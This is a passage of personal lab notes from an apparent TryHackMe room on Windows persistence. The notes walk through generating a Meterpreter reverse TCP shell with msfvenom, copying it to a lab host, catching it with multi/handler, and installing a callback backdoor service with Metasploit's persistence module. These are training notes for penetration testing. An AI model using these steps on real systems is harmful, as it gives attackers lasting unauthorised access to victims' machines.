<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>persistence</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>persistence</h1><br/><p>There are a quite a few ways to maintain access on a machine or network we will be covering a fairly simple way of maintaining access by first setting up a meterpreter shell and then using the persistence metasploit module allowing us to create a backdoor service in the system that will give us an instant meterpreter shell if the machine is ever shutdown or reset.</p><p></p><p>There are also other ways of maintaining access such as advanced backdoors and rootkits however those are out of scope for this room.</p><p></p><p>This will require a little more manual setup than the other tasks so it is recommended to have previous knowledge of msfvenom and metasploit.</p><p></p><p></p><p><strong>Generating a Payload with msfvenomï»¿</strong></p><p></p><p>1.) msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe this will generate a basic windows meterpreter reverse tcp shell</p><p></p><p><img src="images/164-1.png" alt="images/164-1.png" /></p><p></p><p>2.) Transfer the payload from your attacker machine to the target machine.</p><p></p><p>Transfer the <strong>shell.exe</strong> to windows machine using <strong>scp</strong>.</p><p>scp /home/cybex/lab/active_directory_tools/bloodhound_loots/shell.exe administrator@10.10.33.48:/Users/Administrator/Downloads/</p><p></p><p>3.) use <strong>exploit/multi/handler</strong> - this will create a listener on the port that you set it on.</p><p>4.) Configure our payload to be a windows meterpreter shell: <strong>set payload windows/meterpreter/reverse_tcp</strong></p><p>5.) After setting your<strong> THM IP address</strong> as your &quot;<strong>LHOST</strong>&quot;, start the listener with <strong>run</strong></p><p>6.)  <strong>Executing</strong> the <strong>binary</strong> on the <strong>windows machine</strong> will give you a <strong>meterpreter shell</strong> back on your host - let&#39;s return to that</p><p>7.) Verify that we&#39;ve got a meterpreter shell, where we will then <strong>background</strong> it to run the <strong>persistence module</strong>.</p><p></p><p><strong>Run the Persistence Module</strong></p><p></p><p>1.) use <strong>exploit/windows/local/persistence</strong> this module will send a payload every 10 seconds in default however you can set this time to anything you want</p><p>2.) set session 1 set the session to the session that we backgrounded in meterpreter (you can use the sessions command in metasploit to list the active sessions)</p><p></p><p></p><p><img src="images/164-2.png" alt="images/164-2.png" /></p><p></p><p>If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit multi handler and setting the payload to windows/meterpreter/reverse_tcp allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.</p><p></p><p><strong>Note:</strong> The module also tells how to remove persistence.</p><p>Clean Up Meterpreter RC file:</p><p><strong>Just cat the contents and run it inside a meterpreter session to remove persistence.</strong></p><p></p><p></p><p><img src="images/164-3.png" alt="images/164-3.png" /></p><p></p><p>Here you can see the session die however the second we run the handler again we get a meterpreter shell back thanks to the persistence service.</p><p></p><p>There are other ways of maintaining access such as adding users and rootkits however I will leave you to do your own research and labs on those topics.</p><p></p><p></p><p><strong>Using Meterpreter</strong></p><p></p><p>Also we cab achive persistence by using a meterpreter tool.</p><p><strong>https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/</strong></p><p></p></div>
</body>
</html>
